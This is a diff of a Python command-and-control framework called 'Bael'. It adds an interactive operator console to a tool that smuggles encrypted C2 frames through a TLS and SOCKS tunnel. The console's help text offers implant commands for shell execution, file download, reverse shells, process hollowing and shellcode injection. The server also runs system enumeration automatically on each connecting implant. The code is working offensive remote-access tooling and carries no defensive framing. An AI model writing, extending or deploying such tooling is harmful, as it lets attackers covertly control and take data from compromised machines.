@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import asyncio, ssl, argparse, random, os, logging, sys, socket, struct, threading, urllib.request, fcntl
+import asyncio, ssl, argparse, random, os, logging, sys, socket, struct, threading, urllib.request, fcntl, time
 import subprocess, shutil, base64, hashlib, socket, json
 from pathlib import Path
 from collections import deque
@@ -75,59 +75,46 @@ class SocksRelay:
     def __init__(self):
         self.magic = SMUGGLE_MAGIC
 
-    def _hexdump(self, data: bytes, length: int = 16, prefix: str = "") -> str:
-        if not data:
-            return "(empty)"
+    def _hexdump(self,data:bytes,length:int=16,prefix:str="") -> str:
+        if not data: return "(empty)"
         lines = []
         for i in range(0, len(data), length):
             chunk = data[i:i + length]
-            hex_str = ' '.join(f'{b:02x}' for b in chunk)
-            ascii_str = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in chunk)
-            lines.append(f"{prefix}{i:04x}  {hex_str:<{length*3}}  {ascii_str}")
+            hStr = ' '.join(f'{b:02x}' for b in chunk)
+            aStr = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in chunk)
+            lines.append(f"{prefix}{i:04x}  {hStr:<{length*3}}  {aStr}")
         return '\n'.join(lines)
 
-    async def handle(self, socks_r, socks_w, tls_r, tls_w, engine=None):
+    async def handle(self,socks_r, socks_w, tls_r, tls_w, engine=None):
         logger.info("<-> [SOCKS] New client handle started")
         try:
             # === SOCKS5 Handshake ===
             logger.debug("[SOCKS] Reading handshake...")
             header = await asyncio.wait_for(socks_r.read(2), timeout=8.0)
             logger.debug(f"[SOCKS] Handshake header: {header.hex() if header else None}")
-
             if len(header) < 2 or header[0] != 0x05:
-                logger.warning("[x] Bad SOCKS handshake")
-                return
-
+                logger.warning("[x] Bad SOCKS handshake");return
             socks_w.write(b"\x05\x00")
             await socks_w.drain()
             logger.debug("[SOCKS] Sent method selection")
-
             # === SOCKS Request (minimal) ===
             req = await asyncio.wait_for(socks_r.read(4), timeout=5.0)
             logger.debug(f"[SOCKS] Request: {req.hex() if req else None}")
-
             # Skip the rest of the request
-            if len(req) >= 4 and req[3] == 0x01:
-                await socks_r.read(4)   # IPv4
+            if len(req) >= 4 and req[3] == 0x01:await socks_r.read(4)   # IPv4
             elif len(req) >= 4 and req[3] == 0x03:
-                alen = (await socks_r.read(1))[0]
-                await socks_r.read(alen)
+                alen = (await socks_r.read(1))[0];await socks_r.read(alen)
             await socks_r.read(2)  # port
-
             socks_w.write(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")
             await socks_w.drain()
             logger.info("[-] [SOCKS] Handshake completed successfully")
-
             # === Launch both directions with heavy logging ===
             logger.info("[RELAY] Starting bidirectional tasks...")
-            
             socks_to_tls = self._socks_to_tls(socks_r, tls_w, engine)
             tls_to_socks = self._tls_to_socks(tls_r, socks_w, engine)
-
             await asyncio.gather(socks_to_tls, tls_to_socks, return_exceptions=True)
 
-        except asyncio.TimeoutError as e:
-            logger.error(f"[SOCKS] Timeout during handshake: {e}")
+        except asyncio.TimeoutError as e: logger.error(f"[SOCKS] Timeout during handshake: {e}")
         except Exception as e:
             logger.error(f"[SOCKS] handle() crashed: {type(e).__name__}: {e}")
             import traceback
@@ -136,10 +123,8 @@ class SocksRelay:
             logger.info("[SOCKS] Handle shutting down")
             for w in (socks_w, tls_w):
                 try:
-                    if not w.is_closing():
-                        w.close()
-                except:
-                    pass
+                    if not w.is_closing(): w.close()
+                except: pass
 
     async def _socks_to_tls(self, reader, writer, engine):
         logger.info("↗ [TASK] _socks_to_tls started")
@@ -151,7 +136,6 @@ class SocksRelay:
                     logger.info(f"↗ [SMUGGLE] Injecting queued C2 response ({len(smuggled)} bytes) into TLS stream")
                     writer.write(smuggled)
                     await writer.drain()
-
                 # 2. Forward regular SOCKS traffic
                 try:
                     # Use a short timeout so we can return to check the smuggleQueue
@@ -162,77 +146,151 @@ class SocksRelay:
                     logger.debug(f"↗ SOCKS→TLS forwarded {len(data)} bytes")
                     writer.write(data)
                     await writer.drain()
-                except asyncio.TimeoutError:
-                    continue
-        except Exception as e:
-            logger.error(f"↗ _socks_to_tls error: {e}")
+                except asyncio.TimeoutError: continue
+        except Exception as e: logger.error(f"↗ _socks_to_tls error: {e}")
 
     async def _tls_to_socks(self, reader, writer, engine):
         """This is the critical task for receiving whoami"""
         logger.info("↘ [TASK] _tls_to_socks STARTED ← This must appear!")
         buffer = bytearray()
-
         try:
             while True:
                 logger.debug("↘ [TASK] Waiting for data from TLS...")
                 data = await reader.read(16384)
-                
                 if not data:
                     logger.warning("↘ [TASK] TLS server closed connection")
                     break
-
                 logger.info(f"↘ [TASK] RECEIVED {len(data)} bytes from TLS!")
                 buffer.extend(data)
-
                 if len(data) > 16:
                     logger.debug(f"↘ First 64 bytes:\n{self._hexdump(data[:64])}")
-
                 # === C2 Frame Extraction ===
                 while self.magic in buffer:
                     magic_idx = buffer.find(self.magic)
                     logger.info(f"[C2] SMUGGLE_MAGIC FOUND at offset {magic_idx}!")
-
                     if magic_idx > 0:
                         clean = bytes(buffer[:magic_idx])
                         logger.debug(f"Forwarding {len(clean)} clean bytes to SOCKS client")
                         writer.write(clean)
                         await writer.drain()
-
                     header_start = magic_idx + len(self.magic)
                     if len(buffer) < header_start + 2:
                         logger.warning("Incomplete header")
                         break
-
                     payload_len = int.from_bytes(buffer[header_start:header_start+2], "big")
                     frame_end = header_start + 2 + payload_len
-
                     if len(buffer) < frame_end:
                         logger.debug("Incomplete frame")
                         break
-
                     frame = bytes(buffer[magic_idx:frame_end])
                     logger.info(f"[C2] Processing frame ({len(frame)} bytes)")
-
-                    if engine:
-                        await engine.c2.pCommand(frame)
-                    else:
-                        logger.error("No engine!")
-
+                    if engine: await engine.c2.pCommand(frame)
+                    else: logger.error("No engine!")
                     buffer = buffer[frame_end:]
-
                 # Forward normal data
                 if buffer:
                     writer.write(bytes(buffer))
                     await writer.drain()
                     buffer.clear()
-
         except Exception as e:
             logger.error(f"↘ _tls_to_socks CRASHED: {type(e).__name__}: {e}")
             import traceback
             logger.error(traceback.format_exc())
 
 # ========================= CONSOLE ========================== 
+class HiveMindConsole:
+    def __init__(self, engine):
+        self.engine = engine
+        self.running = True
+        self.prompt = "bael> "
+        self.logFile = None
 
+    async def run(self):
+        print("\x1b[38;2;0;150;255mBael C2 Console v0.9.0 - Type 'help' for commands\x1b[0m")
+        while self.running:
+            try:
+                cmd = await asyncio.get_event_loop().run_in_executor(None, input, self.prompt)
+                if not cmd.strip():
+                    self.prompt = "bael> "
+                    continue
+                if cmd.lower() in ["exit", "quit"]:
+                    self._log(f"Console Session Ended")
+                    self.running = False
+                    break
+                elif cmd.lower() == "help":
+                    self.showHelp()
+                elif cmd.startswith("/"):
+                    self.consoleDirect(cmd)
+                elif cmd.strip():
+                    self._log(f"COMMAND: {cmd}")
+                    self.sendCommand(cmd)
+            except Exception as e:
+                logger.error(f"Console error: {e}")
+
+    def _log(self, text: str):
+        if self.logFile:
+            try:
+                with open(self.logFile, "a", encoding="utf-8") as f:
+                    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+                    f.write(f"[{timestamp}] {text}\n")
+            except Exception as e:
+                logger.error(f"Logging failed: {e}")
+                self.logFile = None
+
+    def showHelp(self):
+        hlist = [
+            "Available Commands:",
+            "--- Implant Commands ---",
+            "ping                - Test connectivity",
+            "whoami              - Get current user and hostname",
+            "sysinfo             - Get detailed system and process info",
+            "hardware            - Get CPU/Memory/Disk stats",
+            "exec:<cmd>          - Execute a shell command (e.g., exec:ls -la)",
+            "download:<url>      - Download a file to /tmp",
+            "shell:<ip>:<port>   - Spawn a reverse shell",
+            "hollow:<url>        - Trigger process hollowing (Windows)",
+            "inject:<pid>:<b64>  - Inject shellcode into a PID (Windows)",
+            "--- Console Commands ---",
+            "/silent             - Silences the console prompt, Press a key to re-enable.",
+            "/logging <file>     - Start logging session to file",
+            "/logging off        - Stop active logging session"
+        ]
+        print("\n".join(hlist))
+
+    def consoleDirect(self, command: str):
+        if command == "/silent":
+            self.prompt = ""
+            print("[*] Console prompt silenced. Press Enter to restore.")
+        elif command.startswith("/logging"):
+            parts = command.split()
+            if len(parts) > 1:
+                action = parts[1].lower()
+                if action == "off":
+                    if self.logFile:
+                        print(f"[*] Logging stopped. Session saved to {self.logFile}")
+                        self.logFile = None
+                    else:
+                        print("[!] No active logging session found.")
+                else:
+                    self.logFile = parts[1]
+                    self._log("Console Session Started")
+                    print(f"[*] Logging started: {self.logFile}")
+            else:
+                print("[!] Usage: /logging <filename> OR /logging off")
+
+    def sendCommand(self, command: str):
+        try:
+            # Ensure command format 'cmd:args' is respected for the C2 parser
+            if ":" not in command:
+                command = f"{command}:"
+            
+            # Use 'crypt' to match Bael.__init__ attribute name
+            encrypted = self.engine.crypt.encrypt(command.encode())
+            packet = SMUGGLE_MAGIC + len(encrypted).to_bytes(2, "big") + encrypted
+            self.engine.smuggleQueue.append(packet)
+            logger.info(f"Command sent: {command}")
+        except Exception as e:
+            logger.error(f"Failed to send command: {e}")
 # ============================ C2 ============================
 
 class C2:
@@ -408,8 +466,7 @@ class Bael:
         self.c2 = C2(self.crypt, self, args)
         self.SSLCTX = self._setupPKI()
         self._loadSmuggleData()
-        
-        # === DIAGNOSTICS (minimal addition) ===
+        self.console = HiveMindConsole(self)
         logger.debug(f"PKI Status - Server: {self.server} | Key: {self.shieldKey[:8]}...")
 
     @staticmethod
@@ -449,19 +506,13 @@ class Bael:
         key = BaelShield.get_asset("srv.key" if self.server else "rmt.key", self.shieldKey)
         
         # Filesystem fallback
-        if not ca and hasattr(self.args, 'ca_crt') and os.path.exists(self.args.ca_crt):
-            ca = Path(self.args.ca_crt).read_bytes()
+        if not ca and hasattr(self.args, 'ca_crt') and os.path.exists(self.args.ca_crt): ca = Path(self.args.ca_crt).read_bytes()
         if self.server:
-            if not cert and hasattr(self.args, 'sv_crt') and os.path.exists(self.args.sv_crt):
-                cert = Path(self.args.sv_crt).read_bytes()
-            if not key and hasattr(self.args, 'sv_key') and os.path.exists(self.args.sv_key):
-                key = Path(self.args.sv_key).read_bytes()
+            if not cert and hasattr(self.args, 'sv_crt') and os.path.exists(self.args.sv_crt):cert = Path(self.args.sv_crt).read_bytes()
+            if not key and hasattr(self.args, 'sv_key') and os.path.exists(self.args.sv_key):key = Path(self.args.sv_key).read_bytes()
         else:
-            if not cert and hasattr(self.args, 'rm_crt') and os.path.exists(self.args.rm_crt):
-                cert = Path(self.args.rm_crt).read_bytes()
-            if not key and hasattr(self.args, 'rm_key') and os.path.exists(self.args.rm_key):
-                key = Path(self.args.rm_key).read_bytes()
-
+            if not cert and hasattr(self.args, 'rm_crt') and os.path.exists(self.args.rm_crt):cert = Path(self.args.rm_crt).read_bytes()
+            if not key and hasattr(self.args, 'rm_key') and os.path.exists(self.args.rm_key):key = Path(self.args.rm_key).read_bytes()
         if all([ca, cert, key]):
             logger.info("[*] Full mTLS enabled with embedded certificates")
             base = Path("/dev/shm") if Path("/dev/shm").exists() else Path("/tmp")
@@ -476,8 +527,7 @@ class Bael:
         else:
             logger.warning("Embedded certs not found → Using CERT_NONE fallback (DEV MODE)")
             ctx.verify_mode = ssl.CERT_NONE
-            ctx.check_hostname = False
-            
+            ctx.check_hostname = False    
         return ctx
 
     def cleanup(self):
@@ -513,27 +563,26 @@ class Bael:
     async def spawnServer(self, lhost: str = "0.0.0.0", lport: int = 443):
         svr = await asyncio.start_server(self._clientHandle, lhost, lport, ssl=self.SSLCTX)
         logger.info(f"(C2) Listening on {lhost}:{lport}")
+        
+        # Start the interactive console as a background task
+        asyncio.create_task(self.console.run())
+        
         async with svr: await svr.serve_forever() 
 
     async def _clientHandle(self, r, w):
         peer = w.get_extra_info('peername')
         logger.info(f"(IMPLANT) New connection from {peer}")
-
         try:
             await asyncio.sleep(2.5)        # Increased again
             logger.info("[SERVER] Sending auto enumeration command...")
-
-            enum_cmd = b"sysinfo:"
-            enc = self.crypt.encrypt(enum_cmd)
+            initCMD = b"sysinfo:"
+            enc = self.crypt.encrypt(initCMD)
             resp = SMUGGLE_MAGIC + len(enc).to_bytes(2, "big") + enc
-
             w.write(resp)
             await w.drain()
             logger.info(f"[-] Sent auto enumeration to {peer}")
-
             await asyncio.gather(self._serverToClient(w), self._clientToServer(r))
-        finally:
-            w.close()
+        finally:w.close()
 
     async def _serverToClient(self, w):
         while True:
@@ -675,22 +724,17 @@ def genkeys(args):
 def main():
     p = argparse.ArgumentParser(description=f"Bael v{__version__} — Encrypted mTLS C2")
     p.add_argument("--mode", choices=["tun", "server", "build", "keygen"], default="tun")
-    
     # Build
     p.add_argument("--bl-out", default=".baelBuild")
     p.add_argument("--bl-name", default="bMTLSTUN0")
-    
     # Keygen
     p.add_argument("--kg-out", default=".baelKeys")
-    
     # Connections
     p.add_argument("--lhost", default="0.0.0.0:443")
     p.add_argument("--remote", type=str, help="C2 host:port")
     p.add_argument("--rconnex", action="store_true")
-    
     # Tunnels
     p.add_argument("--socks", action="store_true")
-    
     # PKI / Key
     p.add_argument("--key", default="tWQLh/dj.HI/B2P#4/m#L6h/tV")
     p.add_argument("--ca-crt", default="ca.crt", help="CA certificate path")
@@ -698,36 +742,28 @@ def main():
     p.add_argument("--sv-key", default="srv.key", help="Server private key")
     p.add_argument("--rm-crt", default="rmt.crt", help="Client (remote) certificate")
     p.add_argument("--rm-key", default="rmt.key", help="Client private key")
-    
     # Logging
     p.add_argument("--log-lvl", default="INFO", choices=["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"])
-    
     args = p.parse_args()
     logger.setLevel(args.log_lvl.upper())
-
     if args.mode == "keygen":
-        genkeys(args)
-        return
-
+        genkeys(args);return
     # Embed assets before build or runtime
     logger.info("Attempting to embed assets...")
     embass(args.key, args)
-
     if args.mode == "build":
         Bael.build(args.bl_name, buildPath=args.bl_out)
         return
-
     # Parse hosts
     lhost, lport = args.lhost.split(":") if ":" in args.lhost else (args.lhost, 443)
     rhost, rport = args.remote.split(":") if args.remote and ":" in args.remote else (None, 443)
-    
     conf = {
         "mode": "s" if args.mode == "server" else "c",
         "socks": args.socks,
         "key": args.key,
         "lhost": [lhost, int(lport)],
-        "rhost": [rhost, int(rport)]
-    }
+        "rhost": [rhost, int(rport)]}
+    logger.debug(f"(MAIN:conf) {str(json.dumps(conf,indent=2))}")
     asyncio.run(Bael(conf, args).spawn())
 
 if __name__ == "__main__": main()
